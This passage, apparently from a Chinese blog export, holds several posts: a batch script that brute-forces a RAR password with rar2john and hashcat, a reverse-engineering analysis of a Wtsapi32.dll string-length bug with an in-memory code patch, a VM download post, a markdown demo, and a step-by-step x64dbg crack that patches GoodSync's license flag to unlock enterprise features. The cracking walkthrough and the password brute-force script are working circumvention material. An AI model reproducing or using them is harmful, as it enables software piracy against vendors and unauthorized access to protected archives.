<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="comment">rem szRarFile rar文件名</span></span><br><span class="line"><span class="built_in">set</span> szRarFile=&quot;testfile.rar&quot;</span><br><span class="line"><span class="built_in">echo</span> RAR文件:[<span class="variable">%szRarFile%</span>]</span><br><span class="line"><span class="comment">rem for 循环作用为截取两个冒号中的内容</span></span><br><span class="line"><span class="keyword">for</span> /f  &quot;delims=:, tokens=<span class="number">2</span>&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;..\JohnTheRipper\run\rar2john.exe <span class="variable">%szRarFile%</span>&#x27;)  <span class="keyword">do</span> (</span><br><span class="line">     <span class="built_in">set</span> szHash=&quot;<span class="variable">%%i</span>&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment">rem 去掉字符串的前后双引号</span></span><br><span class="line"><span class="built_in">set</span> szHash=<span class="variable">%szHash:~1,-1%</span></span><br><span class="line"><span class="built_in">echo</span> RAR文件hash值为[<span class="variable">%szHash%</span>]</span><br><span class="line">@<span class="built_in">echo</span> on</span><br><span class="line">hashcat64.exe -m <span class="number">12500</span> -a3 <span class="variable">%szHash%</span> ?d?d?d?d</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>hashcat 支持 RAR3-hp 和 RAR5，官方示例如下：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>-m 参数</th>
<th>类型</th>
<th>示例 hash</th>
</tr>
</thead>
<tbody>
<tr>
<td>12500</td>
<td>RAR3-hp</td>
<td><code>$RAR3$*0*45109af8ab5f297a*adbf6c5385d7a40373e8f77d7b89d317</code></td>
</tr>
<tr>
<td>13000</td>
<td>RAR5</td>
<td><code>$rar5$16$74575567518807622265582327032280$15$f8b4064de34ac02ecabfe9abdf93ed6a$8$9843834ed0f7c754</code></td>
</tr>
</tbody>
</table>
</div>
<p>注意 hash 中，RAR3-hp 值为<code>$RAR3$*0*xxx</code>，中间的数值是0（<code>-hp</code>）而不是1（<code>-p</code>），<code>-p</code>尚未得到支持，只支持<code>-hp</code>。</p>
<p>本例中使用的就是 RAR3-hp，因为没有新版 WinRAR 所以没测试 RAR5 类型。</p>
<p>关于 RAR 参数<code>-p</code>和<code>-hp</code>的区别<br><code>-p</code>：只对 RAR 文件加密，里面的目录和文件名没加密；<br><code>-hp</code>：对目录中的文件名和子目录都进行加密处理。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>WTSEnumerateProcessesExA_进程名截断问题分析</title>
    <url>/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>WTSEnumerateProcessesExA</code>用于获取指定会话中的进程信息，该API位于<code>Wtsapi32.dll</code>，<code>Windows 7</code>至<code>Windows 11</code>均受影响。使用该API获的进程名是不完整的，<code>W</code>版本则无问题。问题出在Unicode编码转多字节编码时，传入的Unicode字符串字节数量错误。</p>
<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>开发环境：Win10 + VS2019，x86、x64均可。注意只有<code>A</code>版有问题，设置如下：工程属性-配置属性-高级-字符集，选择“使用多字节字符集”。</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wtsapi32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Wtsapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwError = <span class="number">0</span>;</span><br><span class="line">    PWTS_PROCESS_INFO ppi = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwCount = <span class="number">0</span>;</span><br><span class="line">    DWORD dwLevel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    dwError = WTSEnumerateProcessesExA(</span><br><span class="line">        WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">        &amp;dwLevel,</span><br><span class="line">        WTS_ANY_SESSION,</span><br><span class="line">        (LPSTR*)&amp;ppi,</span><br><span class="line">        &amp;dwCount);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dwError)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WTSEnumerateProcessesEx error \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;procname is %s\n&quot;</span>, ppi[i].pProcessName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ppi)</span><br><span class="line">    &#123;</span><br><span class="line">        WTSFreeMemoryEx(WTS_TYPE_CLASS::WTSTypeProcessInfoLevel0,</span><br><span class="line">            ppi,</span><br><span class="line">            dwCount);</span><br><span class="line">        ppi = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行上述代码后，进程名显示不完整，如图所示：</p>
<p><img src="/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/截断的进程名.png" alt="截断的进程名"></p>
<p>作为对比，使用<code>W</code>版的API，同时调整工程属性的字符集为Unicode，进程名会正确显示，运行结果如图：</p>
<p><img src="/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/正确的进程名.png" alt="正确的进程名"></p>
<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><p>使用IDA打开x64版本的<code>Wtsapi32.dll</code>并下载PDB文件，先定位到<code>WTSEnumerateProcessesExA</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">WTSEnumerateProcessesExA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        HANDLE hServer,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD *pLevel,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD SessionId,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPSTR *ppProcessInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD *pCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// ebp</span></span><br><span class="line">  DWORD *v8; <span class="comment">// rdi</span></span><br><span class="line">  WTS_TYPE_CLASS v9; <span class="comment">// esi</span></span><br><span class="line">  DWORD *v10; <span class="comment">// r8</span></span><br><span class="line">  PVOID v11; <span class="comment">// rbx</span></span><br><span class="line">  PVOID pMemory; <span class="comment">// [rsp+58h] [rbp+10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  pMemory = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( !pLevel )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  <span class="keyword">if</span> ( !ppProcessInfo )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  v8 = pCount;</span><br><span class="line">  <span class="keyword">if</span> ( !pCount )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">  <span class="keyword">if</span> ( !WTSEnumerateProcessesExW(hServer, pLevel, SessionId, (LPWSTR *)&amp;pMemory, pCount) )</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  <span class="keyword">if</span> ( *pLevel )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *pLevel == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = WTSTypeProcessInfoLevel1;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">    SetLastError(<span class="number">0x57</span>u);</span><br><span class="line">    <span class="keyword">return</span> v5;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = WTSTypeProcessInfoLevel0;</span><br><span class="line">LABEL_9:</span><br><span class="line">  v10 = pLevel;</span><br><span class="line">  v11 = pMemory;</span><br><span class="line">  v5 = ConvertProcessInfoFromUnicodeToAnsi(pMemory, ppProcessInfo, v10, v8);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    WTSFreeMemoryExW(v9, v11, *v8);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>流程较为简单，<code>A</code>版的API先调用<code>W</code>版的API获取进程信息，再通过函数将进程信息中的<code>Unicode</code>转为<code>Ansi</code>，最后释放堆内存；</p>
<p>再定位到<code>ConvertProcessInfoFromUnicodeToAnsi</code>函数（下载PDB后才会显示函数名）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">ConvertProcessInfoFromUnicodeToAnsi</span><span class="params">(__int64 a1, PVOID *a2, _DWORD *a3, ULONG *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 略</span></span><br><span class="line">    </span><br><span class="line">    v19 = StringCchLengthW(*(STRSAFE_PCNZWCH *)(v8 + <span class="number">8</span>), <span class="number">0x105</span>ui64, &amp;pcchLength);</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    MbSize = pcchLength + <span class="number">1</span>;</span><br><span class="line">    Size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(pcchLength + <span class="number">1</span>);</span><br><span class="line">    v20 = LocalAlloc(<span class="number">0x40</span>u, Size);</span><br><span class="line">    *((_QWORD *)v15 + <span class="number">1</span>) = v20;</span><br><span class="line">    <span class="keyword">if</span> ( !v20 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    memset_0(v20, <span class="number">0</span>, Size);</span><br><span class="line">    <span class="keyword">if</span> ( RtlUnicodeToMultiByteN(*((PCHAR *)v15 + <span class="number">1</span>), MbSize, <span class="number">0</span>i64, *(PCWCH *)(v8 + <span class="number">8</span>), pcchLength) )</span><br><span class="line">    &#123;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 略</span></span><br></pre></td></tr></table></figure>
<p>问题出在<code>StringCchLengthW</code>的第三个参数<code>pcchLength</code>，该参数用于获取<code>Unicode</code>字符串的 <strong>字符数</strong>，MSDN对参数的解释如下：</p>
<p><img src="/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/StringCchLengthW.png" alt="StringCchLengthW"></p>
<p>但是<code>RtlUnicodeToMultiByteN</code>的第四个参数，需要传递<code>Unicode</code>字符串的 <strong>字节数</strong><br><img src="/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/RtlUnicodeToMultiByteN.png" alt="RtlUnicodeToMultiByteN"></p>
<p>正确做法是将参数<code>pcchLength * 2</code>后再传给<code>RtlUnicodeToMultiByteN</code>，同时也解释了为什么错误的进程名长度恰好是正确长度的一半。</p>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p><code>WTSEnumerateProcessesA</code>的结果是正确的，用IDA看一下它的实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL __stdcall <span class="title">WTSEnumerateProcessesA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        HANDLE hServer,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD Reserved,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD Version,</span></span></span><br><span class="line"><span class="function"><span class="params">        PWTS_PROCESS_INFOA *ppProcessInfo,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD *pCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 略</span></span><br><span class="line"></span><br><span class="line">    v30 = StringCbLengthW(pProcessName, <span class="number">0x20A</span>ui64, (<span class="keyword">size_t</span> *)&amp;ppProcessInfoa);</span><br><span class="line">    <span class="keyword">if</span> ( v30 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    UnicodeSize = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ppProcessInfoa;</span><br><span class="line">    v15[v20].pProcessName = v18;</span><br><span class="line">    v30 = RtlUnicodeToMultiByteN(v18, v9, &amp;BytesInMultiByteString, v8[v20].pProcessName, UnicodeSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>WTSEnumerateProcessesA</code>中使用了<code>StringCbLengthW</code>获取<code>Unicode</code>字符串的 <strong>字节数</strong>，<code>StringCbLengthW</code>的参数解释如下：</p>
<p><img src="/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/StringCbLengthW.png" alt="StringCbLengthW"></p>
<p>参考<code>WTSEnumerateProcessesA</code>的做法，在调用<code>WTSEnumerateProcessesExA</code>时，将<code>StringCchLengthW</code>替换为<code>StringCbLengthW</code>，应该可以得到正确的结果，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Release x64 ANSI 字符集</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wtsapi32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Wtsapi32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD oldProtect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hDll = GetModuleHandle(<span class="string">&quot;Wtsapi32.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hDll)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为了方便直接用硬编码了</span></span><br><span class="line">    <span class="comment">// HEADER:0000000130000000 </span></span><br><span class="line">    <span class="comment">// .text:0000000130004BF4; HRESULT __stdcall StringCchLengthW</span></span><br><span class="line">    <span class="comment">// .text:0000000130005AD0; HRESULT __stdcall StringCbLengthW</span></span><br><span class="line">    <span class="comment">// .text:0000000130006717 E8 D8 E4 FF FF                call    StringCchLengthW</span></span><br><span class="line"></span><br><span class="line">    PBYTE pMem = (PBYTE)hDll + <span class="number">0x6717</span>;</span><br><span class="line"></span><br><span class="line">    bRet = VirtualProtect(pMem, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    <span class="keyword">if</span> (!bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x5AD0 - 0x4BF4 + 0xFFFFE4D8 = 0xFFFFF3B4</span></span><br><span class="line">    *(pMem + <span class="number">1</span>) = <span class="number">0xB4</span>;</span><br><span class="line">    *(pMem + <span class="number">2</span>) = <span class="number">0xF3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwError = <span class="number">0</span>;</span><br><span class="line">    PWTS_PROCESS_INFO ppi = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwCount = <span class="number">0</span>;</span><br><span class="line">    DWORD dwLevel = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fun(); <span class="comment">//将 StringCchLengthW 地址替换为 StringCbLengthW </span></span><br><span class="line"></span><br><span class="line">    dwError = WTSEnumerateProcessesExA(</span><br><span class="line">        WTS_CURRENT_SERVER_HANDLE,</span><br><span class="line">        &amp;dwLevel,</span><br><span class="line">        WTS_ANY_SESSION,</span><br><span class="line">        (LPSTR*)&amp;ppi,</span><br><span class="line">        &amp;dwCount);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dwError)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WTSEnumerateProcessesEx error \n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;procname is %s\n&quot;</span>, ppi[i].pProcessName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ppi)</span><br><span class="line">    &#123;</span><br><span class="line">        WTSFreeMemoryEx(WTS_TYPE_CLASS::WTSTypeProcessInfoLevel0,</span><br><span class="line">            ppi,</span><br><span class="line">            dwCount);</span><br><span class="line">        ppi = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行后效果如下，这次进程名是正确的：<br><img src="/2023/08/05/%E9%80%86%E5%90%91/WTSEnumerateProcessesExA-%E8%BF%9B%E7%A8%8B%E5%90%8D%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/fixed.png" alt="fixed"></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Win7x64虚拟机</title>
    <url>/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<p>为了方便调试样本，搞了一个Win7x64的虚拟机：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/c915be9c-2f6b-420e-9c9e-f0c932a7fa5b.jpg" alt="c915be9c-2f6b-420e-9c9e-f0c932a7fa5b.jpg"><br>集成了一部分工具，大致如下：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/6ccc5cff-f454-4c51-b77d-d5b8b76a4311.png" alt="6ccc5cff-f454-4c51-b77d-d5b8b76a4311.png"><br>虚拟机配置：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/Win7x64%E8%99%9A%E6%8B%9F%E6%9C%BA/38bfab90-435f-4b65-b1fa-673f37896e9c.png" alt="38bfab90-435f-4b65-b1fa-673f37896e9c.png"></p>
<p>虚拟机大小在15G左右，下载后把ovf导入虚拟机就能用了；<br>常用工具单独打包了一份，1.9G左右，送给有缘人。</p>
<p>下载地址：<br>链接:<br><a href="https://pan.baidu.com/s/1MQmUaDnPq6Hz672M_XkRLw">https://pan.baidu.com/s/1MQmUaDnPq6Hz672M_XkRLw</a></p>
<p>提取码: de8u</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>文件名</th>
<th>MD5</th>
</tr>
</thead>
<tbody>
<tr>
<td>Win7x64模板ovf.z01</td>
<td>1933A48B9AE7CADA94D48BDB8AB98B96</td>
</tr>
<tr>
<td>Win7x64模板ovf.zip</td>
<td>A02E16219FE90F88DB414E101EDD45DF</td>
</tr>
<tr>
<td>Win7x64组件和工具.zip</td>
<td>06CDE3245F6199BCE14CFB122F2CAC42</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title>GoodSync破解</title>
    <url>/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="GoodSync-简介"><a href="#GoodSync-简介" class="headerlink" title="GoodSync 简介"></a>GoodSync 简介</h1><p>GoodSync 是一个很好用的文件同步工具，可以同步本地的目录，也可以将数据同步到另外一台计算机。免费版可以使用完整功能，有30天的限制，30天后同步任务不能超过3个，同步文件数量不能超过100。</p>
<h1 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h1><p>破解过程，主要参考了帖子：<a href="https://www.52pojie.cn/thread-533013-1-1.html">https://www.52pojie.cn/thread-533013-1-1.html</a></p>
<p>先说下大概思路，收费版本有个标志，是0x4000，满足该标志时跳转到企业版（ENTERPRISE）的功能。原帖中，是将跳转前给标志赋值，我这里改动后，有时好使，有时候不好使，具体原因不明，可能是版本更新加入了新的检查，所以稍加改动，找到写入该标志的变量位置，这里赋值为0x4000，功能都正常了，暂时没发现问题。</p>
<h1 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h1><p>因为我这里安装的是64位的版本，所以要用x64dbg调试。断在程序入口后，搜索关键字“ENTERPRISE”：</p>
<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/5f6088e8-66a6-41f0-b1cd-3caa19441f4f.png" alt="5f6088e8-66a6-41f0-b1cd-3caa19441f4f.png"></p>
<p>然后找到<code>[rax + 4]</code>的位置，下硬件写入断点，然后重新运行：</p>
<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/19bcff80-73d7-4d06-8fa6-7d6a6cdba268.png" alt="19bcff80-73d7-4d06-8fa6-7d6a6cdba268.png"></p>
<p>这里会来两次，应该是用于初始化变量，再F9：</p>
<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/c3c7c101-dbb5-4026-8d45-8cb3fdcc30ee.png" alt="c3c7c101-dbb5-4026-8d45-8cb3fdcc30ee.png"></p>
<p>这里将<code>ecx</code>传给<code>[rax + 4]</code>，此时将<code>ecx</code>赋值为0x4000，再进行后续的判断，就变为企业版了，先将</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[rax+4],ecx </span><br></pre></td></tr></table></figure>
<p>改为跳转到一块空白的地址：</p>
<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/a1055c77-8bf7-4ada-8210-a386e2c8b82d.png" alt="a1055c77-8bf7-4ada-8210-a386e2c8b82d.png"></p>
<p>再将新地址写入汇编</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ecx,4000 </span><br><span class="line">mov dword ptr ds:[rax+4],ecx </span><br><span class="line">jmp goodsync-v10.140523429</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/0dfd3759-bd52-4d38-bcff-96557dfa78fe.png" alt="0dfd3759-bd52-4d38-bcff-96557dfa78fe.png"></p>
<p>这样就完成了破解。</p>
<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><p>原帖给程序打补丁时，为了保存寄存器环境，用到的<code>pushad</code>和<code>popad</code>指令，x64中不支持这两条指令，如果有需要，只能手动挨个保存寄存器。<br>详见 Intel 手册《64-ia-32-architectures-software-developer-manual-325462》— “PUSHA/PUSHAD—Push All General-Purpose Registers”章节：<br><img src="/2021/01/03/%E9%80%86%E5%90%91/GoodSync%E7%A0%B4%E8%A7%A3/816b86f1-0a13-4dad-bd13-08972698797f.png" alt="816b86f1-0a13-4dad-bd13-08972698797f.png"></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>GoodSync</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown示例_简单到复杂</title>
    <url>/2021/01/03/%E9%9A%8F%E7%AC%94/markdown%E7%A4%BA%E4%BE%8B_%E7%AE%80%E5%8D%95%E5%88%B0%E5%A4%8D%E6%9D%82/</url>
    <content><![CDATA[<h1 id="简单的"><a href="#简单的" class="headerlink" title="简单的"></a>简单的</h1><h1 id="标题1"><a href="#标题1" class="headerlink" title="标题1"></a>标题1</h1><h2 id="标题2"><a href="#标题2" class="headerlink" title="标题2"></a>标题2</h2><h3 id="标题3"><a href="#标题3" class="headerlink" title="标题3"></a>标题3</h3><ul>
<li>列表1<br>测试</li>
<li>列表2</li>
<li>列表3</li>
</ul>
<p>水平线</p>
<hr>
<ol>
<li>列表1</li>
<li>列表2</li>
<li>列表3</li>
<li>顺序错了不用担心</li>
<li>写错的列表，会自动纠正</li>
</ol>
<h2 id="如果文字后面紧跟着水平线，看看是什么效果"><a href="#如果文字后面紧跟着水平线，看看是什么效果" class="headerlink" title="如果文字后面紧跟着水平线，看看是什么效果"></a>如果文字后面紧跟着水平线，看看是什么效果</h2><p>漂亮的代码，还可以自动高亮</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">i = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello markdown!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>我是斜体</em> </p>
<p>测试文字里面，<strong>我是粗体</strong>，很简单</p>
<p><strong>我是粗体</strong></p>
<hr>
<p>来源： <a href="http://www.wiz.cn/markdown.html">http://www.wiz.cn/markdown.html</a></p>
<h1 id="复杂的"><a href="#复杂的" class="headerlink" title="复杂的"></a>复杂的</h1><p>包含<code>#include &lt;windows.h&gt;</code>头文件</p>
<p><code>字符</code>（简短文字添加代码框）</p>
<p>用2个<code>$</code>标记开始和结尾可以输入表达式，会居中显示：</p>
<script type="math/tex; mode=display">1 \times 2 ^ 2 + 0 \times 2 ^ 1+1 * 2 ^ 1+1 * 2 ^ {-1} +1 * 2 ^ {4k} +1*2 ^ {-3} = 4+0+1+0.5+0.25+0.125=5.875</script><p>用1个<code>$</code>标记开始和结尾也可以，会左对齐显示，对比如下：</p>
<p>$1 \times 2 ^ 2 + 0 \times 2 ^ 1+1 <em> 2 ^ 1+1 </em> 2 ^ {-1} +1 <em> 2 ^ {4k} +1</em>2 ^ {-3} = 4+0+1+0.5+0.25+0.125=5.875$</p>
<p>注意在表达式中使用乘法时，不要用<code>*</code>，hexo中的markdown渲染器会把2个星号转义为斜体，导致公式显示错误，需要用<code>\times</code>显示，上面的表达示仅做演示用，可以看到<code>*</code>和<code>\times</code>的区别。</p>
<p>分数表示：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">方法<span class="number">1</span>：\frac&#123;分子&#125;&#123;分母&#125;</span><br><span class="line">方法<span class="number">2</span>：分子 \over 分母</span><br></pre></td></tr></table></figure>
<p>$\frac{a}{b}$ = ${c} \over {d}$</p>
<p>复杂一点的：</p>
<script type="math/tex; mode=display">x = \dfrac{-b \pm \sqrt{b^2 - 4ac}}{2a}</script><p>取整符号：<br>$\left\lceil\frac{a}{b}\right\rceil = \left\lfloor\frac{a+b-1}{b}\right\rfloor$</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>命令</th>
<th>撤销</th>
<th>重做</th>
